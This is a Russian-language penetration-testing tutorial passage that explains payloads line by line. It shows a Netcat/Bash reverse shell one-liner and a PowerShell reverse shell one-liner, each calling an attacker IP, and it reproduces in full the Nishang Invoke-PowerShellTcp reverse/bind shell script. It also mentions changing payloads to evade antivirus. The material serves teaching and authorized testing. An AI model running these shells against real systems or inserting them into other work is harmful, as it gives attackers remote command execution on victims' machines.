`Have you ever sent an email or text to someone?`

Большинство из нас, вероятно, сталкивались с этим. Сообщение, которое мы отправляем по электронной почте или в текстовом сообщении, — это полезная нагрузка пакета, передаваемого через огромный Интернет. В вычислительной технике полезная нагрузка — это предполагаемое сообщение. В информационной безопасности полезная нагрузка — это команда и/или код, которые используют уязвимость в операционной системе и/или приложении. С точки зрения защиты, полезная нагрузка — это команда и/или код, которые выполняют вредоносное действие. Как мы видели в разделе об обратных оболочках, Windows Defender остановил выполнение нашей полезной нагрузки PowerShell, поскольку она была расценена как вредоносный код.

Помните, что при доставке и выполнении вредоносных программ, как и в случае с любой другой программой, мы даем целевому компьютеру инструкции о том, что ему нужно делать. Термины «вредоносное ПО» и «вредоносный код» романтизируют этот процесс и делают его более загадочным, чем он есть на самом деле. Каждый раз, когда мы работаем с вредоносными программами, давайте попробуем разобраться, что на самом деле делают эти коды и команды. Мы начнем этот процесс с разбора однострочных команд, с которыми мы работали ранее:

---

## Анализ коротких фраз

#### Netcat/Bash Reverse Shell One-linu

        shellsession
`rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.12 7777 > /tmp/f`

Приведённые выше команды представляют собой распространённую однострочную команду, используемую в системе Linux для запуска оболочки Bash через сетевой сокет с использованием прослушивателя Netcat. Мы использовали её ранее в разделе «Привязка оболочек». Её часто копируют и вставляют, но не всегда понимают. Давайте разберём каждую часть этой однострочной команды:

#### Удалите /tmp/f

        shellsession
`rm -f /tmp/f;`

Удаляет `/tmp/f`файл, если он существует, `-f`и заставляет `rm`игнорировать несуществующие файлы. Точка с запятой ( `;`) используется для последовательного выполнения команды.

#### Создайте именованную трубу

        shellsession
`mkfifo /tmp/f;`

Создает [именованный канал FIFO](https://man7.org/linux/man-pages/man7/fifo.7.html) в указанном месте. В данном случае /tmp/f — это именованный канал FIFO, точка с запятой ( `;`) используется для последовательного выполнения команды.

#### Перенаправление вывода

        shellsession
`cat /tmp/f |`

Конкатенирует именованный файл канала FIFO /tmp/f, при этом канал ( `|`) соединяет стандартный вывод команды cat /tmp/f со стандартным вводом команды, следующей за каналом ( `|`).

#### Установить параметры оболочки

        shellsession
`/bin/bash -i 2>&1 |`

Указывает интерпретатор языка командной строки с помощью `-i`параметра, обеспечивающего интерактивный режим работы оболочки. `2>&1`Гарантирует перенаправление стандартного потока данных об ошибках ( `2`) и `&`стандартного потока выходных данных ( `1`) к команде, следующей за конвейером ( `|`).

#### Установите соединение с Netcat

        shellsession
`nc 10.10.14.12 7777 > /tmp/f`

Использует Netcat для отправки соединения нашему хосту атаки, `10.10.14.12`прослушивающему порт `7777`. Вывод будет перенаправлен ( `>`) в /tmp/f, предоставляя оболочку Bash нашему ожидающему прослушивателю Netcat после выполнения команды обратной оболочки в одну строку.

---

## Объяснение однострочных команд PowerShell

Выбор оболочек и полезных нагрузок во многом зависит от того, какую операционную систему мы атакуем. Помните об этом на протяжении всего модуля. Мы убедились в этом в разделе об обратных оболочках, установив обратную оболочку с системой Windows с помощью PowerShell. Давайте разберем использованную нами однострочную команду:

#### Однострочная команда PowerShell

        cmd-session
`powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`

Мы разберем довольно сложную команду PowerShell, которую вы видите выше. Она может показаться сложной, но, надеюсь, мы сможем немного упростить ее понимание.

#### Вызов PowerShell

        cmd-session
`powershell -nop -c`

Выполняется `powershell.exe`без профиля ( `nop`) и выполняет блок команд/скриптов ( `-c`), заключенный в кавычки. Эта конкретная команда вводится внутри командной строки, поэтому PowerShell находится в начале команды. Полезно знать, как это сделать, если мы обнаружим уязвимость удаленного выполнения кода, которая позволяет нам выполнять команды непосредственно в `cmd.exe`.

#### Привязка сокета

        cmd-session
`"$client = New-Object System.Net.Sockets.TCPClient(10.10.14.158,443);`

Устанавливает/оценивает значение переменной, `$client`равное ( `=`) `New-Object`командлету, который создает экземпляр `System.Net.Sockets.TCPClient`объекта платформы .NET. Объект платформы .NET будет подключаться к TCP-сокету, указанному в скобках `(10.10.14.158,443)`. Точка с запятой ( `;`) гарантирует последовательное выполнение команд и кода.

#### Настройка потока команд

        cmd-session
`$stream = $client.GetStream();`

Устанавливает/присваивает переменной `$stream`значение ( `=`) и методу [GetStream](https://docs.microsoft.com/en-us/dotnet/api/system.net.sockets.tcpclient.getstream?view=net-5.0)`$client` платформы .NET , который обеспечивает сетевую связь. Точка с запятой ( ) гарантирует последовательное выполнение команд и кода.[](https://docs.microsoft.com/en-us/dotnet/api/system.net.sockets.tcpclient.getstream?view=net-5.0)`;`

#### Пустой поток байтов

        cmd-session
`[byte[]]$bytes = 0..65535|%{0};`

Создает массив байтов ( `[]`) `$bytes`, который возвращает 65 535 нулей в качестве значений массива. По сути, это пустой поток байтов, который будет направлен на TCP-слушатель на атакующем устройстве в ожидании соединения.

#### Параметры потока

        cmd-session
`while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)`

Запускает `while`цикл, содержащий `$i`переменную, равную ( ), методу [Stream.Read](https://docs.microsoft.com/en-us/dotnet/api/system.io.stream.read?view=net-5.0) ( ) `=`платформы .NET . Параметры: buffer( ), offset( ) и count( ) определены внутри скобок метода.[](https://docs.microsoft.com/en-us/dotnet/api/system.io.stream.read?view=net-5.0)`$stream.Read``$bytes``0``$bytes.Length`

#### Установить кодировку байтов

        cmd-session
`{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);`

Устанавливает/оценивает переменную, `$data`равную ( `=`) классу кодировки [ASCII](https://en.wikipedia.org/wiki/ASCII) платформы .NET, который будет использоваться совместно с `GetString`методом для кодирования потока байтов ( `$bytes`) в ASCII. Короче говоря, то, что мы вводим, будет передаваться и приниматься не просто как пустые биты, а будет кодироваться как текст ASCII. Точка с запятой ( `;`) гарантирует последовательное выполнение команд и кода.

#### Вызов выражения

        cmd-session
`$sendback = (iex $data 2>&1 | Out-String );`

Устанавливает/вычисляет значение переменной, `$sendback`равное ( ) командлету `=`Invoke-Expression ( ) , затем перенаправляет стандартный поток ошибок ( ) в стандартный поток вывода ( ) через канал ( ) к командлету, который преобразует входные объекты в строки. Поскольку используется Invoke-Expression, все, что хранится в $data, будет выполняться на локальном компьютере. Точка с запятой ( ) гарантирует последовательное выполнение команд и кода.`iex``$data``2>``&``1``|``Out-String``;`

#### Показать рабочий каталог

        cmd-session
`$sendback2 = $sendback + 'PS ' + (pwd).path + '> ';`

Устанавливает/вычисляет значение переменной, `$sendback2`равное ( `=`) `$sendback`переменной плюс ( `+`) строке PS ( `'PS'`) плюс `+`путь к рабочему каталогу ( `(pwd).path`) плюс ( `+`) строке `'> '`. В результате в командной строке отобразится PS C:\workingdirectoryofmachine >. Точка с запятой ( `;`) гарантирует последовательное выполнение команд и кода. Напомним, что оператор + в программировании объединяет строки, когда числовые значения не используются, за исключением некоторых языков, таких как C и C++, где потребуется функция.

#### Устанавливает значение Sendbyte

        cmd-session
`$sendbyte=  ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}`

Устанавливает/вычисляет значение переменной, `$sendbyte`равное ( `=`) потоку байтов в кодировке ASCII, который будет использоваться TCP-клиентом для инициирования сеанса PowerShell с прослушивателем Netcat, работающим на атакуемом компьютере.

#### Завершить TCP-соединение

        cmd-session
`$client.Close()"`

Это метод [TcpClient.Close](https://docs.microsoft.com/en-us/dotnet/api/system.net.sockets.tcpclient.close?view=net-5.0) , который будет использоваться при разрыве соединения.

Однострочный скрипт, который мы только что рассмотрели, также может быть выполнен в виде сценария PowerShell ( `.ps1`). Пример этого можно увидеть в исходном коде ниже. Этот исходный код является частью проекта [nishang](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) :

        PowerShell
``function Invoke-PowerShellTcp  {  <# .SYNOPSIS Nishang script which can be used for Reverse or Bind interactive PowerShell from a target.  .DESCRIPTION This script is able to connect to a standard Netcat listening on a port when using the -Reverse switch.  Also, a standard Netcat can connect to this script Bind to a specific port. The script is derived from Powerfun written by Ben Turner & Dave Hardy .PARAMETER IPAddress The IP address to connect to when using the -Reverse switch. .PARAMETER Port The port to connect to when using the -Reverse switch. When using -Bind it is the port on which this script listens. .EXAMPLE PS > Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444 Above shows an example of an interactive PowerShell reverse connect shell. A netcat/powercat listener must be listening on  the given IP and port.  .EXAMPLE PS > Invoke-PowerShellTcp -Bind -Port 4444 Above shows an example of an interactive PowerShell bind connect shell. Use a netcat/powercat to connect to this port.  .EXAMPLE PS > Invoke-PowerShellTcp -Reverse -IPAddress fe80::20c:29ff:fe9d:b983 -Port 4444 Above shows an example of an interactive PowerShell reverse connect shell over IPv6. A netcat/powercat listener must be listening on the given IP and port.  .LINK http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html https://github.com/nettitude/powershell/blob/master/powerfun.ps1 https://github.com/samratashok/nishang #>           [CmdletBinding(DefaultParameterSetName="reverse")] Param(         [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")]        [String]        $IPAddress,         [Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="bind")]        [Int]        $Port,         [Parameter(ParameterSetName="reverse")]        [Switch]        $Reverse,         [Parameter(ParameterSetName="bind")]        [Switch]        $Bind     )          try    {        #Connect back if the reverse switch is used.        if ($Reverse)        {            $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)        }         #Bind to the provided port if Bind switch is used.        if ($Bind)        {            $listener = [System.Net.Sockets.TcpListener]$Port            $listener.start()            $client = $listener.AcceptTcpClient()        }          $stream = $client.GetStream()        [byte[]]$bytes = 0..65535|%{0}         #Send back current username and computername        $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")        $stream.Write($sendbytes,0,$sendbytes.Length)         #Show an interactive PowerShell prompt        $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')        $stream.Write($sendbytes,0,$sendbytes.Length)         while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)        {            $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding            $data = $EncodedText.GetString($bytes,0, $i)            try            {                #Execute the command on the target.                $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )            }            catch            {                Write-Warning "Something went wrong with execution of command on the target."                Write-Error $_            }            $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> '            $x = ($error[0] | Out-String)            $error.clear()            $sendback2 = $sendback2 + $x             #Return the results            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)            $stream.Write($sendbyte,0,$sendbyte.Length)            $stream.Flush()        }        $client.Close()        if ($listener)        {            $listener.Stop()        }    }    catch    {        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port."        Write-Error $_    } }``

---

## Полезные нагрузки принимают различные формы и размеры.

Понимание того, что делают различные типы полезных нагрузок, может помочь нам понять, почему антивирус блокирует их выполнение, и дать нам представление о том, что нам, возможно, потребуется изменить в нашем коде, чтобы обойти ограничения. Это мы подробнее рассмотрим в этом модуле. А пока поймите, что полезные нагрузки, которые мы используем для получения командной оболочки в системе, во многом будут определяться операционной системой, языками программирования и даже языками программирования, присутствующими на целевом устройстве.

Не все полезные нагрузки представляют собой однострочные команды и развертываются вручную, как те, которые мы изучали в этом разделе. Некоторые генерируются с помощью автоматизированных фреймворков для атак и развертываются как предварительно упакованные/автоматизированные атаки для получения оболочки. Как, например, очень мощная атака `Metasploit-framework`, с которой мы будем работать в следующем разделе.